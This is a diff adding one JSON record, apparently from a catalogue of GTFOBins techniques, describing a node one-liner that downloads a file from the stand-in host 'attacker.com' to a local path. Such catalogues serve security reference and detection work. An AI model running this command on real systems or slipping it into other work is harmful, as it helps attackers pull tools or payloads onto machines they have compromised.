@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-node-download",
+  "name": "GTFOBins · node (download)",
+  "command": "node -e 'require(\"http\").get(\"http://attacker.com/path/to/input-file\", res => res.pipe(require(\"fs\").createWriteStream(\"/path/to/output-file\")))'",
+  "description": "Use node to download via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "node",
+    "download"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/node/#download",
+  "upstream_id": "node/download/0",
+  "category": "gtfobins",
+  "subcategory": "file-download",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/node/"
+    }
+  ]
+}
